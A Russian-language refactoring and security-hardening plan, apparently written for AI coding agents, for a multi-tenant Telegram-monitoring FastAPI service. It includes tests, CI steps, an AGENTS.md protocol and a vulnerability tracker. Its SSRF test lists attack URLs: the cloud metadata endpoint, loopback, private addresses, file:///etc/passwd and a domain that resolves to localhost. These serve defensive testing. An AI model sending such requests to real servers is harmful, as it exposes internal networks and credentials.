Вернувшиеся `message_id` — и есть новые. Не вернувшиеся — уже были.

**Красный тест** — `tests/test_41_dedup_race.py`:

```python
@pytest.mark.asyncio
async def test_concurrent_dedup_yields_each_message_once(db, user, monitor):
    msgs = [{"id": i, "text": f"пост {i}"} for i in range(50)]
    a, b = await asyncio.gather(
        filter_new(db, user.id, monitor.chat_id, msgs),
        filter_new(db, user.id, monitor.chat_id, msgs),
    )
    ids = [m["id"] for m in a] + [m["id"] for m in b]
    assert len(ids) == len(set(ids)) == 50, "сообщение обработано дважды"
```

---

### Задача 4.3 — Таблица `jobs` для ручного запуска

Web больше не опрашивает Telegram сам. `POST /api/monitors/{id}/run` пишет строку в `jobs`
и возвращает `202 Accepted` с `job_id`. Воркер забирает через
`SELECT ... FOR UPDATE SKIP LOCKED`. Фронтенд опрашивает `GET /api/jobs/{id}`.

Это тот же принцип «одна база на всё», что в Rails-шаблоне даёт Solid Queue. Redis не нужен.

**Красный тест** — `tests/test_42_jobs.py`: два воркера, забирающие задачи одновременно,
не берут одну и ту же (проверка `SKIP LOCKED`); зависшая задача (`started_at` старше 10 минут)
возвращается в очередь.

---

### Задача 4.4 — Защита от SSRF в вебхуках

**Проблема.** `webhook_url` не валидируется, а `POST /api/webhook/send-payload`
(`server.py:1577`) принимает произвольный payload и постит его куда угодно. Это открытый
прокси во внутреннюю сеть Railway.

`app/services/webhook.py`:

1. Разрешены только схемы `http` и `https`.
2. **Резолвить DNS и проверять полученный IP**, а не строку. Проверка по имени хоста обходится
   доменом, который резолвится в `127.0.0.1`.
3. Запретить приватные и служебные диапазоны: `10/8`, `172.16/12`, `192.168/16`, `127/8`,
   `169.254/16` (метаданные облака), `::1`, `fc00::/7`.
4. Запретить редиректы (`follow_redirects=False`) — иначе проверка обходится редиректом.
5. Таймаут и лимит размера ответа.
6. `POST /api/webhook/send-payload` — удалить. Если функция нужна, она шлёт только на
   **сохранённый** URL пользователя, без возможности указать адрес в запросе.

**Красный тест** — `tests/test_43_ssrf.py`:

```python
@pytest.mark.parametrize("url", [
    "http://127.0.0.1:8000/", "http://169.254.169.254/latest/meta-data/",
    "http://10.0.0.1/", "http://[::1]/", "file:///etc/passwd",
    "http://localtest.me/",          # публичное имя → 127.0.0.1
])
def test_ssrf_urls_rejected(url):
    with pytest.raises(UnsafeWebhookURL):
        validate_webhook_url(url)
```

---

### Задача 4.5 — Лимиты на LLM

Сейчас каждый опрос шлёт полные тексты постов в OpenRouter без потолка (`server.py:795`).
Канал с длинными постами и интервалом 15 минут — это неограниченный счёт.

Добавить: потолок символов на запрос, счётчик израсходованных токенов на пользователя за
период, автоотключение AI при превышении с записью в журнал.

**Красный тест:** запрос с текстом длиннее лимита обрезается, а не отправляется целиком;
при превышении месячного лимита `process_messages_batch_with_llm` возвращает `None`
и пишет лог, не обращаясь к API.

---

### Задача 4.6 — Секреты не попадают в журнал

`add_log` (`server.py:317`) пишет сырые тексты исключений. HTTP-исключения `httpx` содержат
заголовки, а в заголовках — `Authorization: Bearer sk-or-...`.

Реализация: функция `redact(text)` со списком паттернов (`sk-or-[\w-]+`, `\d{8,10}:[\w-]{35}`,
`Bearer \S+`), применяется ко всем `details` перед записью.

**Красный тест:** `add_log(details="Bearer sk-or-v1-secret")` сохраняет строку без `sk-or-v1-secret`.

---

### Задача 4.7 — Прочие исправления корректности

| Что | Где | Как |
|---|---|---|
| `get_setting` считает `""` за «не задано» и уходит в fallback — нельзя очистить webhook_url | `server.py:267` | различать `None` и `""` |
| `update_integrations_config` строит `SET {k} = ?` из ключей словаря — сток для инъекции имени колонки | `server.py:251` | белый список колонок или ORM |
| `/health` отдаёт анониму `id`, `first_name`, `username` аккаунта | `server.py:1075` | отдавать только `{"status": "ok"}` |
| `iter_messages` + `break` по времени обрывается на закреплённом сообщении | `server.py:706` | `continue` вместо `break`, ограничение по `limit` |

---

## 8. ФАЗА 5 — Фронтенд

---

### Задача 5.1 — Разобрать `index.html`

3975 строк в одном файле. Разложить: разметка в `index.html`, стили в `static/css/`,
логика в `static/js/` по вкладкам (`feed`, `channels`, `messages`, `integration`, `logs`)
плюс общие `api.js`, `render.js`, `auth.js`.

Сборку **не заводим** — остаёмся на ES-модулях (`<script type="module">`). Ванильный SPA
работает и быстрый; менять его на сборку — отдельное решение, за рамками этой задачи.

---

### Задача 5.2 — Экранирование по умолчанию

В `render.js` — единственная функция построения HTML, которая экранирует все подстановки.
Прямой `innerHTML` со строковой интерполяцией запрещается тестом из задачи 0.4, который теперь
проверяет и новые файлы. Это то, что не даёт XSS вернуться.

---

### Задача 5.3 — Экраны входа

`login.html`, `signup.html`, `password-reset.html`. Отдельные страницы, не часть SPA:
на них не должно грузиться ничего лишнего.

---

### Задача 5.4 — Аватарки из строк ленты

`photo_base64` лежит в каждой строке `analysis_feed` и целиком уезжает клиенту при
`GET /api/feed?limit=200` (`server.py:452`). Двести base64-аватарок — это мегабайты на запрос.

Вынести в таблицу `chat_avatars` (`chat_id`, `image_bytes`, `fetched_at`), отдавать через
`GET /api/avatars/{chat_id}` с `Cache-Control`. Из ответа `/api/feed` убрать и `photo_base64`,
и `raw_messages_json` (последний нужен только в детальном виде — `GET /api/feed/{id}`).

**Красный тест:** ответ `GET /api/feed?limit=50` весит меньше 200 КБ и не содержит `data:image`.

---

## 9. ФАЗА 6 — Вход через Google (Firebase)

**Ключевое решение: Firebase — провайдер идентичности, а не система сессий.**
`firebase-admin` проверяет ID-токен → находим или создаём пользователя в своей таблице →
выдаём **свою** cookie-сессию. Так остаётся контроль над отзывом доступа, работает админка,
и потом можно добавить GitHub или Apple, не переписывая аутентификацию.

- `POST /auth/google` принимает `id_token`, верифицирует через `firebase_admin.auth.verify_id_token`.
- Связывание: если email из Google совпадает с существующим пользователем — привязать провайдера
  (`identities`: `user_id`, `provider`, `provider_uid`), а не создавать дубль.
- `users.password_hash` становится nullable — пользователь может не иметь пароля вовсе.

**Красный тест** — `tests/test_60_google.py` с подменённой верификацией:
невалидный токен → 401; валидный токен нового пользователя → создание + сессия;
валидный токен с email существующего пользователя → привязка, а не второй аккаунт;
подделанный токен с чужим `aud` → 401.

---

## 10. ФАЗА 7 — Деплой и CI

---

### Задача 7.1 — Два сервиса Railway

Один Docker-образ, две команды:

```
web:    uvicorn app.main:app --host 0.0.0.0 --port $PORT
worker: python -m app.worker
```

Общий managed Postgres по приватной сети. Все секреты — переменные окружения Railway.
`railway.json` обновить: healthcheck на `/health`.

**Проверка:** редеплой не требует переавторизации в Telegram (сессия в БД, задача 3.2).

---

### Задача 7.2 — Заголовки безопасности

Middleware: `Content-Security-Policy` (запретить inline-скрипты — после задачи 5.1 это
возможно), `Strict-Transport-Security`, `X-Content-Type-Options: nosniff`,
`Referrer-Policy: strict-origin-when-cross-origin`, `X-Frame-Options: DENY`.

**Красный тест:** каждый заголовок присутствует в ответе.

---

### Задача 7.3 — CI

По образцу `Ruby/.github/workflows/ci.yml` — четыре джоба:

| Джоб | Команда | Аналог в Rails-шаблоне |
|---|---|---|
| `security` | `bandit -r app/ -ll && pip-audit` | `brakeman` |
| `lint` | `ruff check . && ruff format --check .` | `rubocop` |
| `typecheck` | `mypy app/` | `npm run check` |
| `test` | `pytest -q` с сервисом Postgres | `bin/rails test` |

Плюс собственный джоб `secret-scan`: `gitleaks` или `trufflehog` по всему дереву.
Область сканирования — **всё дерево**, не список расширений. Узкая проверка создаёт ложное
спокойствие: зелёная метрика при живом ключе в дереве хуже, чем отсутствие метрики.

---

### Задача 7.4 — Документация

Переписать `README.md` и `PROJECT_OVERVIEW.md` под новую архитектуру. Удалить `server.py`
после переноса всего кода в `app/`. Финальная запись в `PROGRESS.md`.

---

## 11. Содержимое файла `AGENTS.md`

Создать `FastAPI/AGENTS.md` ровно с этим текстом (задача 0.6):

````markdown
# Правила работы над Teleton

Над этим репозиторием работают несколько ИИ-агентов и человек. Агенты друг друга не видят:
у каждого своя сессия и свой контекст. Всё, что не записано в репозиторий, для остальных
не существует.

Этот файл — протокол, который делает параллельную работу возможной. Прочитайте его целиком
в начале сессии, до первого изменения файлов.

---

## 0. Что это за проект и чем он опасен

Teleton читает Telegram-каналы **от лица живого пользовательского аккаунта** через MTProto
(Telethon), анализирует посты через LLM и рассылает их в n8n и Telegram-ботов. Приложение
мульти-тенантное: каждый пользователь подключает свой аккаунт.

Отсюда следует главное. **На сервере лежат MTProto-сессии чужих аккаунтов.** Такая сессия —
не пароль: её нельзя сбросить удалённо, и она даёт полное чтение переписки владельца. Утечка
базы — это не «утечка данных сервиса», это компрометация всех подключённых аккаунтов разом.

Практический вывод: в этом репозитории правило «сначала работает, потом безопасно» не действует.
Задача, закрывающая функциональность, но открывающая доступ, считается не сделанной.

---

## 1. Перед началом работы

```bash
git fetch --all --prune
git log --oneline -15
gh pr list --state open
git worktree list
```

Затем прочитайте `PROGRESS.md` — журнал проходов. Раздел «Что не сработало» особенно важен:
там записано, какие подходы уже пробовали и почему они не подошли. Повторять их заново —
потерянный проход.

---

## 2. Своя ветка

Имя ветки — `phase<N>/task<N.M>-<короткое-имя>`, номер совпадает с номером задачи в плане.
По списку веток и открытых PR видно, какие задачи заняты.

Прямой push в `main` запрещён.

Если работаете параллельно с другим агентом — заведите отдельный worktree. Общий `.venv`
на два каталога приводит к тому, что установленная одним агентом зависимость ломает прогон
у второго, а выглядит это как «тест падает по непонятной причине».

---

## 3. Порядок работы: CDD

Строго в этом порядке:

1. **Красный тест** — `tests/test_NN_<имя>.py` по разделу «Красный тест» из плана задачи.
   Запустить. Он **обязан упасть**, и упасть на `assert`, а не на `ImportError`.
2. **Реализация** до зелёного.
3. **Проверка**: `pytest -q && ruff check . && mypy app/`.
4. **Коммит**: одна задача — один коммит, сообщение начинается с номера задачи.

Тест, написанный после реализации, проверяет то, что вы сделали, а не то, что требовалось.
В проекте, где половина задач про безопасность, это разница между «код работает» и
«код делает ровно то, что заявлено».

**Тест не удаляется и не ослабляется, чтобы стал зелёным.** Если тест мешает — либо в нём
ошибка (исправьте тест и объясните в PR почему), либо ошибка в реализации. Третьего варианта нет.

---

## 4. Задача закрывается не автором

Не помечайте задачу выполненной на основании статического уровня теста. Поведенческий уровень
требует живого Postgres и настоящего Telegram-аккаунта; вердикт выносит прогон в среде, где
они есть. В PR пишите отдельно, что подтверждено, а что осталось неподтверждённым — это и есть
содержательная часть ревью.

Поведенческий тест при отсутствии среды обязан честно писать `pytest.skip` с внятной причиной.
Тест, который в отсутствие базы возвращает зелёный, хуже отсутствующего теста.

---

## 5. База данных

**Схема меняется только миграцией Alembic.** Никакого DDL руками через панель Railway или `psql`.
Нарушение этого правила невидимо: код в репозитории не меняется, PR показывать нечего, а
следующий `alembic upgrade head` в другой среде вернёт схему к состоянию из репозитория.

Миграции только вперёд. Уже применённый файл не редактируется — заводится следующий.

**`ALTER TABLE` в коде приложения запрещён.** До рефакторинга схема мигрировалась шестью блоками
`try: cur.execute("ALTER TABLE ...") except Exception: pass` — ошибки проглатывались, и узнать,
что колонка не добавилась, было невозможно. Правило держит тест `test_13_migrations.py`.

**`user_id` обязателен во всех тенантных таблицах**, `NOT NULL`, с индексом. Правило держит
`test_12_models.py`. Запрос без фильтра по `user_id` — это утечка данных между клиентами, а не
стилистическая придирка.

**Не пишите `WHERE user_id = ...` руками.** Ходите через `TenantRepo` — слой, в котором забыть
фильтр невозможно. Один забытый `where` в одном обработчике из сорока — и пользователь A читает
ленту пользователя B.

---

## 6. Telethon и Telegram

**Долгоживущими клиентами владеет только воркер.** Веб-процесс поднимает клиент лишь на время
авторизации пользователя и отключает сразу после. Два процесса на одном auth-key приводят к
`AUTH_KEY_DUPLICATED`, и Telegram может убить сессию пользователя — то есть ваша ошибка
выбрасывает клиента из его собственного аккаунта.

**Сессии хранятся как `StringSession` в БД в зашифрованном виде.** Файлы `.session` не создаются
никогда: на Railway файловая система эфемерна, файл исчезает при редеплое, и пользователь
получает требование заново вводить SMS-код.

**`FloodWaitError` — не ошибка, а сигнал.** Не ретраить сразу. При `seconds > 300` пропустить
цикл и записать `retry_after`. Telethon умеет ждать сам, но ожидание на несколько часов вешает
воркер целиком.

**Не превышайте лимит запросов кода авторизации.** Три попытки в час на пользователя — это
не защита сервера, а защита аккаунта клиента от вашего же сервиса: Telegram ограничивает
аккаунты, которым слишком часто шлют коды.

---

## 7. Учётные данные

Пароли и ключи не вставляются в чат, в тикеты, в PR и в файлы репозитория — даже временно,
даже «чтобы агент подключился». Всё, что попало в переписку, считается скомпрометированным
и требует перевыпуска; удаление сообщения или файла ничего не отменяет.

**Так уже случилось.** `.dockerignore` содержал `.venv/` и `__pycache__`, но не содержал `.env`,
`*.session` и `storage.db`, а `Dockerfile` делал `COPY . .`. В каждый собранный образ попадали
`TELEGRAM_API_HASH`, живой auth-key Telegram-аккаунта и база с ключом OpenRouter. Файлы при этом
были в `.gitignore` — то есть выглядело всё правильно, и в git они действительно не попали.
`.gitignore` и `.dockerignore` — разные файлы с разными списками; совпадение одного не говорит
ничего о втором.

`.env` в репозиторий не попадает. `APP_ENCRYPTION_KEY` не хранится нигде, кроме переменных
окружения Railway. Секрет-скан в CI — обязательный гейт, и сканирует он **всё дерево**, а не
список расширений: узкая проверка даёт зелёный статус при живом ключе в репозитории, и это
хуже, чем отсутствие проверки.

---

## 8. Запись прохода

После задачи допишите в `PROGRESS.md`:

```markdown
### <дата> — задача N.M «<название>»

**Сделано:** ...
**Подтверждено:** какие тесты зелёные и в какой среде.
**Не подтверждено:** что требует прогона с живым Postgres / Telegram.
**Что не сработало:** отвергнутые подходы и почему. ← самое ценное для следующего агента
**Дальше:** ...
```

Раздел «Что не сработало» экономит чужой проход. «Всё получилось» не сообщает ничего.

`PROGRESS.md` правится **одним коммитом в конце PR**, а не по ходу работы — иначе конфликты
при параллельной работе.

---

## 9. Документация: где живёт статус

| Что | Где |
|---|---|
| Прогресс по задачам | `PROGRESS.md` |
| Архитектура и API | `PROJECT_OVERVIEW.md` |
| Установка и запуск | `README.md` |
| Правила работы | `AGENTS.md` (этот файл) |

Больше нигде. Остальные документы на статус **ссылаются**, а не повторяют его. Скопированный
статус устаревает молча: через месяц два документа рассказывают разное, и определить по тексту,
какой из них новее, нельзя.

**Точки входа правятся добавлением, а не заменой.** `AGENTS.md`, `README.md` и
`PROJECT_OVERVIEW.md` целиком не переписываются: устаревший раздел правится или помечается
устаревшим, но не удаляется заодно с соседними. Пропажу такого рода не видно в диффе — там
она выглядит как сокращение.

---

## 10. Что такое зелёный

На PR проверяются: `pytest -q`, `ruff check`, `mypy app/`, `bandit -r app/ -ll`, `pip-audit`,
секрет-скан по всему дереву.

**Тест, который не запускается локально, — не «проблема среды», пока это не доказано.**
Одно объяснение на два разных падения — это гипотеза, а не вывод. Симптом закрывается
установкой зависимости и прогоном, а не рассуждением.

---

## 11. Ограничения, которые уже стоили времени

- **`.gitignore` ≠ `.dockerignore`.** См. §7. Секреты были корректно исключены из git и при этом
  попадали в каждый Docker-образ.
- **`SELECT` + `INSERT` не заменяют `ON CONFLICT`.** Дедупликация через отдельные запросы имеет
  окно между ними: ручной запуск и тик планировщика по одному каналу отправляли один пост дважды.
  Только `INSERT ... ON CONFLICT DO NOTHING RETURNING`.
- **Проверка SSRF по имени хоста бесполезна.** Домен может резолвиться в `127.0.0.1`
  (`localtest.me` — публичный пример). Резолвьте DNS и проверяйте полученный IP. И запрещайте
  редиректы: иначе разрешённый URL отправляет на запрещённый.
- **Пустая строка ≠ «не задано».** `get_setting` считал `""` за отсутствие значения и уходил
  в fallback, из-за чего было невозможно очистить `webhook_url` или отключить ключ.
- **403 вместо 404 на чужом объекте — утечка.** 403 подтверждает, что объект существует.
  На чужие ресурсы всегда 404.
- **`iter_messages` идёт от новых к старым.** `break` по временному окну обрывает выборку на
  первом закреплённом сообщении, которое может прийти вне хронологии. Нужен `continue`.
- **Ключ шифрования нельзя ротировать «на живую».** Смена `APP_ENCRYPTION_KEY` без
  перешифровки делает нечитаемыми все Telegram-сессии пользователей — то есть выбрасывает всех
  из аккаунтов. Ротация — отдельная процедура с перешифровкой, а не смена переменной.
- **Firebase — провайдер идентичности, а не система сессий.** ID-токен проверяется один раз
  при входе, дальше работает своя cookie-сессия. Иначе теряется возможность отозвать доступ.
````

---

## 12. Полный список найденных проблем — трекер

Отмечайте по мере закрытия. Номера ссылаются на задачи выше.

### Критические

- [ ] **К1** `.dockerignore` пропускает `.env`, `*.session`, `storage.db`, `key.md` → задача 0.1
- [ ] **К2** Нет аутентификации ни на одном из ~40 эндпоинтов → задача 2.3
- [ ] **К3** `GET /api/openrouter`, `GET /api/telegram-forward` отдают сырые ключи → задача 0.3
- [ ] **К4** Секреты в БД открытым текстом → задача 3.4
- [ ] **К5** SSRF: `webhook_url` без валидации, `POST /api/webhook/send-payload` → задача 4.4

### Высокие

- [ ] **В6** Stored XSS через `chat_title` / `d.name` / `log.*` → задача 0.4
- [ ] **В7** `POST /api/settings` перезаписывает `.env` целиком → задача 1.2
- [ ] **В8** Файл сессии на эфемерной ФС Railway → задача 3.2
- [ ] **В9** Нет rate limiting, включая запрос кода Telegram → задача 2.7
- [ ] **В10** `auth_state` — глобальная переменная процесса → задача 3.3
- [ ] **В11** Нет CSRF-защиты → задача 2.6

### Средние

- [ ] **С12** Гонка в дедупликации → задача 4.2
- [ ] **С13** SQLite без WAL, соединение на каждый вызов → Фаза 1
- [ ] **С14** Одно-процессность из-за синглтона Telethon → задача 4.1
- [ ] **С15** Миграции через `try/except ALTER TABLE` → задача 1.4
- [ ] **С16** `get_setting`: пустая строка = «не задано» → задача 4.7
- [ ] **С17** `update_integrations_config` строит `SET {k}` из ключей словаря → задача 4.7
- [ ] **С18** Нет лимитов расходов на LLM → задача 4.5
- [ ] **С19** `photo_base64` и `raw_messages_json` в списочном ответе ленты → задача 5.4
- [ ] **С20** Секреты в текстах исключений в журнале → задача 4.6
- [ ] **С21** Дубль `FastAPI/Ruby/`, пустой `storage.db` в корне → задача 0.5
- [ ] **С22** `/health` раскрывает данные аккаунта анониму → задача 4.7
- [ ] **С23** `iter_messages` + `break` обрывается на закреплённом посте → задача 4.7

---

## 13. Открытые вопросы — решить до Фазы 1

1. **Чей `API_ID`/`API_HASH`?** Один общий на весь сервис (удобно пользователю, но Telegram может
   ограничить `api_id`, через который логинятся сотни аккаунтов) или каждый пользователь заводит
   свой на my.telegram.org (трение при онбординге, риск размазан по пользователям).
2. **Postgres или SQLite с томом Railway?** План написан под Postgres — SQLite держит одну запись
   за раз и не переживает мульти-тенант с параллельной записью веба и воркера. Если сервис
   останется на десяток пользователей, том дешевле; тогда Фаза 1 упрощается, но задача 4.1
   (два процесса) становится невозможной.
3. **Что показывать пользователю при подключении Telegram?** Нужен явный дисклеймер: сервис
   получает доступ к чтению переписки, а массовая автоматизация пользовательских аккаунтов —
   серая зона в ToS Telegram, и аккаунт может быть ограничен.
4. **Сроки хранения.** Автоочистка уже есть (7/14/30/60/90 дней), но для публичного сервиса
   нужен ещё и полный экспорт и удаление аккаунта по запросу пользователя.
